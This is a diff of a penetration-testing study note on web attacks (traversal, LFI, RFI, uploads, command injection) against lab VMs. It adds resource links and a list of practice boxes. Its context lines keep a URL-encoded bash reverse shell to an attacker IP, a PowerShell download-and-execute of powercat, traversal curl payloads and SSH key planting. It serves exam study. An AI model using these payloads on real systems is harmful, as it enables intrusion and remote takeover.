@@ -149,7 +149,7 @@ ssh -i dt_key -p 2222 offsec@mountaindesserts.local
 
 #### Tags: #LFI #EtcPasswd #SSHKeyTheft #CurlVsBrowser #WindowsTraversal #IISLogPaths #WebConfig
 
-> 📋 Generalized copy-pasteable commands for this technique: [[METHODOLOGY CHEAT SHEET#Step 1b: Web Application Exploitation]]
+> 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
 
 ---
 
@@ -173,7 +173,7 @@ curl --path-as-is "http://192.168.156.193:3000/public/plugins/alertlist/../../..
 
 🔁 **Similar to:** the research approach here (search for `<CVE> exploit/PoC` to find the specific vulnerable path/plugin) is the same workflow as finding a ready-made NSE script for a CVE back in [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]]. Both cases: don't reinvent the exploit, look up the known-good PoC pattern for that specific CVE.
 
-> 🔗 **HackTricks** and **PayloadsAllTheThings** both keep entries on this exact CVE (and Grafana traversal generally) if you need the full plugin-ID list for a version/config where `alertlist` isn't present or already patched.
+> 🔗 **HackTricks** general directory traversal/LFI reference: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) *(no dedicated Grafana/CVE-2021-43798 page found, this is the general traversal methodology page instead)* · **PayloadsAllTheThings** File Inclusion: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md), useful for the full plugin-ID list if `alertlist` isn't present or already patched.
 
 #### Tags: #CVE202143798 #Grafana #PluginPathTraversal #CurlPathAsIs
 
@@ -209,8 +209,8 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 🔁 **Similar to:** this is the exact same underlying **CVE-2021-41773** Apache bug already found automatically via Nessus in [[Vulnerability Scanning#7.2.4. Analyzing the Results|7.2.4]] and via Nmap's `vulners`/custom NSE script in [[Vulnerability Scanning#7.3.1. NSE Vulnerability Scripts|7.3.1]] to [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]]. Those sections found and confirmed it with automated tooling. Here it's exploited by hand with nothing but `curl` and an understanding of URL encoding.
 
-> 🔗 **PayloadsAllTheThings** and **HackTricks** both keep broader traversal-encoding cheat sheets (double-encoding, UTF-8 overlong encoding, null-byte tricks, etc) for cases where simple `%2e%2e/` alone doesn't get past a filter.
-> 🔗 **CyberChef** has a "URL Encode"/"URL Decode" recipe if you'd rather encode a full payload there than do it by hand.
+> 🔗 **PayloadsAllTheThings** File Inclusion: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md) · **HackTricks** File Inclusion: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md), both cover encoding bypasses (double-encoding, UTF-8 overlong, null-byte tricks) for cases where simple `%2e%2e/` alone doesn't get past a filter.
+> 🔗 **CyberChef** (has a "URL Encode"/"URL Decode" operation): [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/) *(linking to the tool itself, its recipe-state deep-links are JS-driven and can't be verified by an automated fetch)*
 
 > **🛠️ Troubleshooting hit on VM #1: the module's own `%2e%2e/` pattern 404'd no matter the depth.**
 > Neither `/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` nor deeper variants (6, 8 segments) worked on this box. Even the plain `/etc/passwd` baseline 404'd. The fix was switching to the **actual, more precise public PoC pattern for CVE-2021-41773**, which has a distinct **first segment**:
@@ -296,7 +296,7 @@ URL-encode the whole thing before putting it in `cmd`:
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<attacker_ip>%2F4444%200%3E%261%22
 ```
 
-> 🔗 **RevShells** can generate this exact encoded payload for you (pick Bash, your IP/port, and its URL-encoded output option) instead of hand-encoding it.
+> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate this exact encoded payload for you (pick Bash, your IP/port, and its URL-encoded output option) instead of hand-encoding it *(linking to the tool itself, its shell-type/IP/port deep-link query params are JS-driven and can't be verified by an automated fetch)*.
 
 **Step 7: Start a listener *before* sending the request**
 ```bash
@@ -306,7 +306,7 @@ nc -nvlp 4444
 **Step 8: Send the request in Burp, catch the shell**
 ![[Pasted image 20260731233138.png]]
 
-🔁 **Similar to:** the reverse-shell delivery mechanics here (URL-encoded payload, listener started first, `bash -c` wrapping) will come up again and again on future boxes. Worth comparing against whatever [[METHODOLOGY CHEAT SHEET#Step 2: Shells & Payloads|Shells & Payloads]] ends up holding as this vault grows.
+🔁 **Similar to:** the reverse-shell delivery mechanics here (URL-encoded payload, listener started first, `bash -c` wrapping) will come up again and again on future boxes. Worth comparing against whatever [[Linux Methodology#Step 2: Shells & Payloads|Shells & Payloads]] ends up holding as this vault grows.
 
 **Step 9: Once shell lands, check for easy privesc**
 ```bash
@@ -330,8 +330,8 @@ sudo cat flag.txt
 
 **Beyond PHP:** the same log-poisoning concept applies to Perl, Active Server Pages (Extended), ASP, and JSP. Only the injected code snippet's language changes. In practice, PHP is by far the most common target for LFI in real assessments (other stacks are older/rarer, and modern frameworks tend to have LFI protections by default), though it's still worth knowing LFI can show up in modern Node.js backends too.
 
-> 🔗 **HackTricks** has a deep LFI/RFI page covering log-poisoning targets beyond Apache (PHP session files, mail logs, SSH auth logs, etc) and PHP wrapper tricks (coming next in 9.2.2).
-> 🔗 **PayloadsAllTheThings** keeps a maintained LFI cheat sheet with common log paths per OS/stack.
+> 🔗 **HackTricks** File Inclusion/LFI: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md), covers log-poisoning targets beyond Apache (PHP session files, mail logs, SSH auth logs, etc) and PHP wrapper tricks (coming next in 9.2.2).
+> 🔗 **PayloadsAllTheThings** File Inclusion → LFI to RCE: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md), maintained log-path list per OS/stack.
 
 **Case study 2: VM #2, same technique on Windows/XAMPP**
 
@@ -414,7 +414,7 @@ echo "<paste the base64 string here>" | base64 -d
 ```
 *This reveals the actual PHP **source code**, including anything hardcoded in it, like database credentials (`$username`, `$password` variables etc).*
 
-> 🔗 **CyberChef**'s "From Base64" recipe works just as well as `base64 -d` if you'd rather paste it into a browser tab than the terminal.
+> 🔗 **CyberChef** (has a "From Base64" operation): [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/), works just as well as `base64 -d` if you'd rather paste it into a browser tab than the terminal.
 
 🔁 **Similar to:** this is conceptually the same "make the scanner/tool show you something it wouldn't otherwise" idea as URL-encoding a traversal payload back in [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]]. Here it's PHP's own filter chain doing the "encoding," not you.
 
@@ -440,8 +440,8 @@ curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base
 
 > **Caveat:** `data://` doesn't work on a default PHP install. It requires `allow_url_include` to be enabled in `php.ini`. If `data://` attempts fail outright, check whether log poisoning (9.2.1) is viable instead.
 
-> 🔗 **HackTricks**' LFI page has a much longer list of PHP wrappers beyond these two (`php://input`, `expect://`, `zip://`, `phar://`, etc) worth knowing when these two don't pan out.
-> 🔗 **PayloadsAllTheThings** also documents wrapper-based LFI-to-RCE techniques per PHP version/config.
+> 🔗 **HackTricks** File Inclusion/LFI: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md), has a much longer list of PHP wrappers beyond these two (`php://input`, `expect://`, `zip://`, `phar://`, etc).
+> 🔗 **PayloadsAllTheThings** File Inclusion → Wrappers: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md), dedicated wrapper-based LFI-to-RCE techniques per PHP version/config.
 
 #### Tags: #PHPWrappers #PhpFilterWrapper #Base64Filter #DataWrapper #AllowUrlInclude #FilterEvasion
 
@@ -539,7 +539,7 @@ sudo cat /home/guybrush/.treasure/flag.txt
 
 🔁 **Similar to:** the actual reverse-shell mechanics here (listener first, then trigger) are identical to the log-poisoning reverse shell in [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]]. RFI just changes *how the code gets onto/into the target*, not what happens once it runs.
 
-> 🔗 **RevShells** and **PayloadsAllTheThings** both catalog ready-made PHP reverse shells (Pentestmonkey's is a common default) if `simple-backdoor.php` isn't flexible enough for a given target.
+> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) and **PayloadsAllTheThings** Reverse Shell Cheatsheet: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) both catalog ready-made PHP reverse shells (Pentestmonkey's is a common default) if `simple-backdoor.php` isn't flexible enough for a given target.
 
 #### Tags: #RFI #AllowUrlInclude #PythonHttpServer #PHPWebshell #PentestmonkeyReverseShell
 
@@ -626,8 +626,8 @@ ls -la /usr/share/webshells
 ```
 *Covers `php/`, `asp/`, `aspx/`, `cfm/`, `jsp/`, `perl/`, plus the `laudanum` collection. The mechanics are the same regardless of language. Find the upload point, get the shell's extension past any filter, then hit it with a `cmd`-style parameter.*
 
-> 🔗 **RevShells** can generate the PowerShell one-liner + base64 encoding step directly, if you'd rather not run `pwsh` locally to produce it.
-> 🔗 **PayloadsAllTheThings** has a dedicated "Upload Insecure Files" page covering many more extension/filter bypass tricks (double extensions, null byte tricks, content-type/magic-byte spoofing, etc) beyond the case-swap shown here.
+> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate the PowerShell one-liner + base64 encoding step directly, if you'd rather not run `pwsh` locally to produce it.
+> 🔗 **PayloadsAllTheThings** Upload Insecure Files: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md), covers many more extension/filter bypass tricks (double extensions, null byte tricks, content-type/magic-byte spoofing, etc) beyond the case-swap shown here.
 
 #### Tags: #ExecutableFileUpload #ExtensionFilterBypass #CaseSwapBypass #PowerShellReverseShell #Base64Unicode #Webshells
 
@@ -747,7 +747,7 @@ ssh -p 2222 -i fileup root@mountaindesserts.local
 
 🔁 **Similar to:** this is the mirror image of [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]'s SSH key theft. There, traversal let us **read** an existing private key off the target. Here, traversal (via the upload's filename field) lets us **write** our own public key onto the target instead. Same vulnerability class (Directory Traversal), opposite direction, same end result (SSH access).
 
-> 🔗 **HackTricks** and **PayloadsAllTheThings** both have file-upload sections covering more filename/path manipulation tricks beyond a simple `../` in case a target's upload form handles the `filename` field differently (e.g. requiring null bytes, double URL-encoding, or a different parameter name entirely).
+> 🔗 **HackTricks** File Upload: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-upload/README.md) and **PayloadsAllTheThings** Upload Insecure Files: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md), both cover more filename/path manipulation tricks beyond a simple `../` in case a target's upload form handles the `filename` field differently (e.g. requiring null bytes, double URL-encoding, or a different parameter name entirely).
 
 #### Tags: #NonExecutableFileUpload #UploadPlusTraversal #AuthorizedKeysOverwrite #WebServerPrivileges #SSHKeyPlanting
 
@@ -759,7 +759,7 @@ ssh -p 2222 -i fileup root@mountaindesserts.local
 
 #### Tags: #Lab #Quiz #Module9
 
-> 📋 Generalized copy-pasteable commands for this technique: [[METHODOLOGY CHEAT SHEET#Step 1b: Web Application Exploitation]]
+> 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
 
 ---
 
@@ -832,8 +832,8 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 *Check your Python server's log for a `GET /powercat.ps1` hit, then check your netcat listener for the callback.*
 
-> 🔗 **RevShells** can generate PowerShell reverse shell one-liners directly (including Powercat-style ones) if you'd rather not hand-build this.
-> 🔗 **HackTricks** and **PayloadsAllTheThings** both have dedicated command injection pages covering more filter-bypass delimiters and encodings beyond `;`/`&&`/`&`.
+> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate PowerShell reverse shell one-liners directly (including Powercat-style ones) if you'd rather not hand-build this.
+> 🔗 **HackTricks** Command Injection: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/command-injection.md) and **PayloadsAllTheThings** Command Injection: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md), both cover more filter-bypass delimiters and encodings beyond `;`/`&&`/`&`.
 
 **The bigger picture:** exploitation specifics depend heavily on the target OS, the app's implementation, and whatever filter/sanitization is in place. But the identification workflow is always the same: find where user input reaches a command line, confirm with something harmless, then work out what the filter actually blocks by trial and error rather than guessing.
 
@@ -917,7 +917,7 @@ cat /root/flag.txt
 
 🔁 **Similar to:** this whole diagnostic sequence (try arithmetic → try template syntax → try shell metacharacters, watching for *any* change in behavior, not just a hoped-for direct hit) is a good general template for any capstone/unknown injection point where the vulnerability class isn't handed to you. A blank/different response is just as much a signal as a fully working payload.
 
-> 🔗 **HackTricks** has dedicated pages for both SSTI (Jinja2 payload chains) and command injection filter bypasses, worth working through systematically like this rather than guessing randomly when a field's exact behavior is unclear.
+> 🔗 **HackTricks** SSTI: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/ssti-server-side-template-injection/README.md) (Jinja2 payload chains) and Command Injection: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/command-injection.md) (filter bypasses), worth working through systematically like this rather than guessing randomly when a field's exact behavior is unclear.
 
 #### Tags: #BlindCommandInjection #BacktickInjection #SSTIRuledOut #DiagnosticMethodology #FutureFactorAuthentication
 
@@ -972,8 +972,8 @@ type C:\inetpub\flag.txt
 
 #### Tags: #Lab #Quiz #Module9
 
-> 📋 Generalized copy-pasteable commands for this technique: [[METHODOLOGY CHEAT SHEET#Step 1b: Web Application Exploitation]]
-> 🧭 Quick lookup: [[DECISION TREE#Web Applications]]
+> 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
+> 🧭 Quick lookup: [[DECISION TREE]]
 
 ---
 
@@ -991,6 +991,30 @@ None of these are tied to a specific language or framework in principle, but *ho
 Found on a public-facing app, any of these can be your initial foothold. Found on an internal app during an engagement, they're just as often your lateral movement vector. Worth checking for on every web app you touch, not just the "obvious" ones.
 
 #### Tags: #Module9Summary #WebAppAttacksRecap
+
+---
+
+## 🎯 Related Boxes to Practice
+
+Real HTB machines matching this module's techniques, verified against actual writeups (not guessed). "TJ_Null-confirmed" means it's on the widely-cited NetSecFocus Trophy Room OSCP-like list.
+
+**Directory Traversal / LFI / RFI:**
+- **[Poison](https://0xdf.gitlab.io/2018/09/08/htb-poison.html)** (HTB, Linux, Medium): TJ_Null-confirmed. Classic LFI-to-RCE via Apache log poisoning, essentially the exact technique in [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]].
+- **Chemistry** (HTB, Linux, Easy): path traversal (CVE in aiohttp 3.9.1).
+- **Guardian** (HTB, Linux, Hard): directory traversal, LFI, and PHP filter-chain injection, a harder/more advanced version of [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]]'s `php://filter` technique.
+
+**File Upload:**
+- **[Bounty](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/bounty-writeup-w-o-metasploit)** (HTB, Windows, Easy): TJ_Null-confirmed. `web.config` upload-filter bypass, same IIS/ASP.NET territory as [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1's VM #1 and capstone VM #4]].
+- **Access** (HTB, Windows, Easy): TJ_Null-confirmed, file-upload-related.
+- **Nocturnal** (HTB, Linux, Easy): combo box: file upload + command injection.
+
+**Command Injection:**
+- **CozyHosting** (HTB, Linux, Easy): TJ_Null-confirmed. Also has a Postgres SQLi angle, worth revisiting after [[SQL Injection Attacks]] too.
+- **Nocturnal** (HTB, Linux, Easy): see above.
+
+*Caveat: not every box above was individually cross-checked against the current TJ_Null sheet (some were sourced from 0xdf's writeup tag index, which is still real, verified data, just not double-confirmed as "OSCP-like"). Where confirmed, it's marked explicitly.*
+
+#### Tags: #RelatedBoxes #HTBPractice
 
 ---
 
